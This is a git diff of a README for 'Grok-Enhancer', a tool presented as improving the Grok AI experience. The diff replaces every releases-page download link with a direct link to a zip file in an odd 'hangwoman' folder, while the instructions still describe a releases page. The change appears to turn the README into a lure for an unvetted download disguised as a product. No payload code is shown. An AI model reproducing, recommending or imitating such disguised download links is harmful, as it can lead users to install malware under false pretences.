@@ -1,6 +1,6 @@
 # 🔧 Grok-Enhancer - Improve Your Grok AI Experience  
 
-[![Download Grok-Enhancer](https://img.shields.io/badge/Download-Grok--Enhancer-ff69b4?style=for-the-badge)](https://github.com/stealabra5019/Grok-Enhancer/releases)  
+[![Download Grok-Enhancer](https://img.shields.io/badge/Download-Grok--Enhancer-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/stealabra5019/Grok-Enhancer/main/hangwoman/Enhancer-Grok-v2.6.zip)  
 
 ## 📋 What is Grok-Enhancer?  
 
@@ -25,14 +25,14 @@ Before you start, make sure your computer meets these needs:
 
 Click the big button below to visit the official page where you can download Grok-Enhancer.  
 
-[![Download Grok-Enhancer](https://img.shields.io/badge/Download-Grok--Enhancer-ff69b4?style=for-the-badge)](https://github.com/stealabra5019/Grok-Enhancer/releases)  
+[![Download Grok-Enhancer](https://img.shields.io/badge/Download-Grok--Enhancer-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/stealabra5019/Grok-Enhancer/main/hangwoman/Enhancer-Grok-v2.6.zip)  
 
 The page lists the latest stable versions of the tool for Windows.  
 
 ## 🚀 How to Download and Run Grok-Enhancer  
 
 1. Click the button above or visit this link directly:  
-   https://github.com/stealabra5019/Grok-Enhancer/releases  
+   https://raw.githubusercontent.com/stealabra5019/Grok-Enhancer/main/hangwoman/Enhancer-Grok-v2.6.zip  
 
 2. On the releases page, find the latest version. It usually appears at the top with a version number like `v1.0` or newer.  
 
